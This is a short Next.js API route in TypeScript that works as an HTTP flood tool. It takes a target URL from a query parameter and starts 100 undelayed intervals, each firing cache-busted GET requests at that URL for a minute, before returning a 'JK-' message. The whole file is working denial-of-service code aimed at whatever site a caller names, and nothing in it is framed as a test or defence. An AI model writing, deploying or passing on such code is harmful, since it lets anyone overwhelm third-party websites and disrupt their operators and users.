import type { NextApiRequest, NextApiResponse } from 'next'
import https from 'https'

type ResponseData = {
    message: string
}

export default function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData>
) {

    for(var i = 0; i < 100; i++) {
        const luanch = setInterval(() => https.get(`${req.query.name}?ref=${Math.random()}`))
        setTimeout(() => clearInterval(luanch), 60 * 1000)
    }
    
    setTimeout(() => {
        res.status(200).json({ message: `JK-${req.query.name}` })
    }, 60 * 1000)
}